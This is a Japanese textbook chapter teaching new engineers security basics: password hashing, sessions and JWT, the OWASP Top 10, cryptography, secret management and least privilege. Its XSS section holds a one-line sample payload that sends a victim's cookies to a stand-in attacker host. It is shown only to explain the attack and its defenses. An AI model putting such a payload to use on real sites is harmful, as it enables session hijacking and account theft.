## この章のゴール

セキュリティは「**専門家がやる難しいこと**」ではなく、**全エンジニアの最低限の教養** です。
無防備なコードは公開した瞬間にクローラに見つかり、数時間で攻撃を受けます。

この章では、現場で必ず守るべき認証・認可・暗号・典型的な脆弱性 (OWASP Top 10) を扱います。

## 17-1. セキュリティの3本柱 (CIA)

| 文字 | 意味 |
|------|------|
| **C**onfidentiality (機密性) | 許可された人だけが読める |
| **I**ntegrity (完全性) | データが改ざんされていない |
| **A**vailability (可用性) | 必要なときに使える |

「漏れない・変えられない・止まらない」の3つを守るのが基本姿勢。

## 17-2. 認証 (Authentication) と認可 (Authorization)

新人が混同しがちな2語。

| | 質問 | 例 |
|--|------|----|
| **認証 (AuthN)** | あなたは誰? | ID + パスワードでログイン |
| **認可 (AuthZ)** | あなたに権限ある? | 管理画面に入れるか |

「ログインできる」と「何ができる」は別問題。両方の設計が必要です。

## 17-3. パスワードの取り扱い

**パスワードを生のままDBに保存するのは絶対NG**。流出した瞬間に全ユーザーが危険。

### ハッシュ化 (Hashing)

「**元に戻せない一方向変換**」をかけて保存する。

```
"password123" → bcrypt → "$2b$12$xxxxx..."
```

ログイン時は入力された値を同じハッシュ関数で変換して比較。

### ソルト (Salt) と 何度も繰り返す

- **ソルト**: ユーザーごとに違うランダム文字列を混ぜる (レインボーテーブル対策)
- **ストレッチ**: ハッシュを何万回も繰り返す (ブルートフォース対策)

これらを自前で実装するのは危険。**bcrypt / Argon2 / scrypt** など実績あるライブラリを必ず使う。

```python
# Python の例 (bcrypt ライブラリ)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
bcrypt.checkpw(input_password.encode(), hashed)  # ログイン時
```

### 多要素認証 (MFA / 2FA)

「パスワード + SMS コード」「パスワード + 認証アプリ」のように **2つ以上の要素** を組み合わせる。
パスワード漏洩しても2段目で止められる。社内システム・管理画面では事実上必須。

## 17-4. セッションとトークン

ログイン状態を保つ仕組み。

### セッション方式 (Cookie)

1. ログイン成功時、サーバーで **セッションID** を発行
2. クライアントに Cookie で保存
3. 以後のリクエストで Cookie が送られる
4. サーバーは セッションID から ユーザーを引く (Redis や DB)

Cookie 設定の鉄則:
- `HttpOnly` — JSから読めない
- `Secure` — HTTPS でだけ送る
- `SameSite=Lax` または `Strict` — CSRF対策

### JWT (JSON Web Token)

「ユーザー情報 + 有効期限 + 署名」を1つの文字列に固めたトークン。
**サーバー側で状態を持たなくていい** のがメリット (= ステートレス)。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE2OTk5OTk5OTl9.SIGNATURE
```

ただし「**JWT を取り消したい**」場面で苦労する (= 失効リストが必要)。短い有効期限 + リフレッシュトークン併用が定石。

### OAuth 2.0 と OpenID Connect

「Google でログイン」「GitHub で連携」の裏側。
**第三者アプリにユーザー認証を委譲する** 仕組み。実装はライブラリに任せて、原理を理解するのが現実的なライン。

## 17-5. OWASP Top 10 — 必ず知るべき脆弱性

業界団体 OWASP が定期更新する「**世界で最も多い脆弱性Top 10**」。
ここでは特に頻出のものを抜粋。

### 1. インジェクション (SQL/コマンド)

第14章で触れた SQL インジェクション。コマンド・LDAP・NoSQL 版もある。
対策: **ユーザー入力をクエリに文字列結合しない**、プレースホルダ使う。

### 2. 認証の不備

- 弱いパスワードを許可
- ハッシュなし保存
- ログイン試行回数制限なし
- セッション固定化攻撃

対策: 多要素認証、強パスワードポリシー、bcrypt 等、レート制限。

### 3. XSS (Cross-Site Scripting)

ユーザー入力に JavaScript を埋め込まれ、他のユーザーのブラウザで実行される攻撃。

```html
<!-- 投稿に攻撃者が書いた内容 -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

対策: 出力時に **エスケープ**、Content-Security-Policy ヘッダー、Cookie は HttpOnly。
React/Vue などの現代フレームワークはデフォルトでエスケープしてくれる。

### 4. CSRF (Cross-Site Request Forgery)

別サイトに罠を仕込み、ログイン中のユーザーに知らずに送信させる攻撃。

対策: **CSRFトークン**、Cookie に `SameSite=Lax/Strict`。

### 5. 認可の不備 (IDOR)

`/users/123/edit` の `123` を `124` に書き換えたら他人を編集できた、というよくある脆弱性。

対策: **「サーバー側で本人かチェック」を必ず入れる**。クライアント側のチェックは無意味。

### 6. 機密データの露出

- パスワードやAPIキーをログに出す
- 個人情報を平文でDB保存
- HTTPで送信

対策: 必要なデータだけ持つ、ハッシュ/暗号化、HTTPS、ログにマスキング。

### 7. セキュリティ設定ミス

- デフォルトパスワード放置
- エラー画面でスタックトレース表示
- 不要なポート開放
- 古いソフトの脆弱性放置

対策: **「動いたら終わり」ではなく「動かないようにする」設定** を心がける。

### 8. 既知の脆弱な依存関係

ライブラリの脆弱性放置。`npm audit`、Dependabot、GitHub Security alerts などで自動検知。

### 9. ログと監視の不備

「攻撃を受けたことに気づけない」が一番怖い。最低限のセキュリティログ (ログイン失敗、権限変更) は取る。

### 10. SSRF (Server-Side Request Forgery)

サーバーに「内部リソースに対してリクエストを送らせる」攻撃。クラウド環境では特に致命的 (メタデータエンドポイントから認証情報が漏れる)。

## 17-6. 暗号 — 「暗号化」と「ハッシュ」と「署名」

混同しがちな3語の区別。

| 用語 | 元に戻せる? | 用途 |
|------|------------|------|
| **ハッシュ** | × (一方向) | パスワード、チェックサム |
| **共通鍵暗号** | ◯ (同じ鍵) | データ暗号化 (AES) |
| **公開鍵暗号** | ◯ (鍵ペア) | TLS、署名 (RSA, ECDSA) |
| **デジタル署名** | (検証のみ) | 改ざん検知 |

### TLS の中身

HTTPS が暗号化と認証を両立できているのは:
1. 公開鍵暗号で **暗号化用の共通鍵を安全に交換** (鍵交換)
2. 以降は **共通鍵暗号 (AES)** で本文を暗号化 (速い)
3. 同時に **証明書** でサーバーの正当性を確認

## 17-7. シークレット管理

API キー、DBパスワード、JWT 署名鍵... これらをどう扱うか。

❌ NG パターン:
- コードに直書き
- Git に commit
- Slack で平文共有

✅ 推奨:
- **環境変数** か **シークレット管理サービス** (AWS Secrets Manager, GCP Secret Manager, HashiCorp Vault)
- `.env` ファイルは `.gitignore` に
- ローテーション (定期的に更新)

GitHub にうっかり API キーを commit すると、**数分でクローラに収集** されます (経験者多数)。一度漏れたキーは無効化必須。

## 17-8. 最小権限の原則 (PoLP)

「**そのユーザー / アプリに必要な権限だけ与える**」。

- DBユーザーは本番は読み書きのみ、スキーマ変更権は別
- IAM ロールは「全許可」ではなく必要な操作だけ
- 開発者は本番DBへ直接接続できない (踏み台経由)

「いざというときの被害範囲を最小化」する設計指針。

## 17-9. CORS — 別オリジンからのアクセス制御

ブラウザは **「別のオリジン (= ドメイン + ポート)」** に JS から勝手にリクエストを送ることを制限しています。これが **同一オリジンポリシー**。

API を別ドメインから叩く場合、サーバー側で許可を出す **CORS ヘッダー** が必要。

```http
Access-Control-Allow-Origin: https://myapp.example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
```

新人が「CORS で動かない」と詰まるのは通過儀礼。**「ブラウザがブロックしてる」「サーバー設定の問題」** を切り分けるのがコツ。

## 17-10. セキュリティはレイヤで守る

**1か所に強いガードを置く** より、**複数のレイヤで重ね合わせる** のがセキュリティの基本。

```
[WAF/CDN]
   ↓
[ファイアウォール]
   ↓
[アプリ層: 認証/認可/入力検証]
   ↓
[DB層: ロール/暗号化]
   ↓
[OS/インフラ: 最小権限]
```

どこか一つ突破されても、次のレイヤで止める。これを **多層防御 (Defense in Depth)** と呼びます。

## まとめ

- セキュリティの3本柱 = **機密性・完全性・可用性 (CIA)**
- **認証 (誰?)** と **認可 (何ができる?)** を区別
- パスワードは **bcrypt/Argon2 + ソルト + ストレッチ**。生保存はNG
- セッション or JWT、Cookie は **HttpOnly + Secure + SameSite**
- **OWASP Top 10**: SQLi, XSS, CSRF, IDOR, 設定ミス... を必ず潰す
- ハッシュ・共通鍵暗号・公開鍵暗号・署名を区別
- シークレットは **環境変数 / シークレット管理サービス** で
- **最小権限の原則** で被害範囲を制限
- **CORS** はブラウザのオリジン保護、サーバー側で許可
- セキュリティは **多層防御** で重ねる

次の章では、コードの品質を支えるもう一つの柱 — **テスト** に進みます。
